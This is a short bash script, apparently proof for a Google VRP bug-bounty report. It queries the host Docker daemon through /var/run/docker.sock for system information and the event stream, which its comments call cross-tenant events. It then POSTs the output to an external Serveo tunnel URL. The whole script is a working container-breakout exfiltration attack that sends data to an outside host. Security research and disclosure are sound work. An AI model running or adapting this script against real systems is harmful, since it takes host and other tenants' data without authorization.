#!/bin/bash
# Use your current Serveo URL
URL="https://97ab4b9024fcd239-103-95-173-85.serveousercontent.com"

{
  echo "--- [!] GOOGLE VRP: HOST-BREAKOUT EVIDENCE ---"
  echo "Timestamp: $(date)"
  
  # The "Smoking Gun": Docker System Info
  # This proves you have control over the host infrastructure
  curl -s --unix-socket /var/run/docker.sock http://localhost/info
  
  # The "Isolation Breach": Cross-tenant events
  echo -e "\n--- EVENT STREAM ---"
  curl -s --unix-socket /var/run/docker.sock "http://localhost/events?until=$(date +%s)" | head -n 5
} | curl -s -X POST --data-binary @- "$URL"
